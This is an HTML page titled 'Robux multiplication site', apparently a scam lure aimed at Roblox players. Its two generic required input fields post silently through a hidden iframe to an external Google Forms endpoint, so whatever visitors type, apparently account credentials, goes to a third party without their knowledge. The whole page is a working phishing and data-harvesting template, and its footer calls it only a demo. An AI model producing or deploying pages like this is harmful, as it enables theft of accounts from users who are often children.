<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Robux multiplication site</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body{
    margin:0;
    height:100vh;
    background:#0f0f0f;
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:Arial, Helvetica, sans-serif;
  }
  .box{
    width:100%;
    max-width:380px;
    background:#1a1a1a;
    padding:24px;
    border-radius:12px;
    box-shadow:0 0 20px rgba(0,0,0,.6);
  }
  h1{
    color:#fff;
    text-align:center;
    margin-bottom:18px;
  }
  input{
    width:100%;
    padding:14px;
    margin-bottom:14px;
    font-size:16px;
    border-radius:8px;
    border:none;
  }
  button{
    width:100%;
    padding:14px;
    font-size:16px;
    border:none;
    border-radius:8px;
    background:#4caf50;
    color:#fff;
    cursor:pointer;
  }
  .note{
    margin-top:10px;
    font-size:12px;
    color:#aaa;
    text-align:center;
  }
</style>
</head>
<body>

<div class="box">
  <h1>Enter Information</h1>

  <form
    action="https://docs.google.com/forms/d/e/1FAIpQLScQPI1GesErzZy_5sUddufuo9LW2ljMbQIY9JIcXNvP0FF7BA/formResponse"
    method="POST"
    target="hidden_iframe"
  >
    <!-- Field 1 -->
    <input
      type="text"
      name="entry.123456789"
      placeholder="Enter Text"
      required
    >

    <!-- Field 2 -->
    <input
      type="text"
      name="entry.987654321"
      placeholder="Enter Value"
      required
    >

    <button type="submit">Submit</button>
  </form>

  <iframe name="hidden_iframe" style="display:none;"></iframe>

  <div class="note">
    Demo input page. No authentication.
  </div>
</div>

</body>
</html>
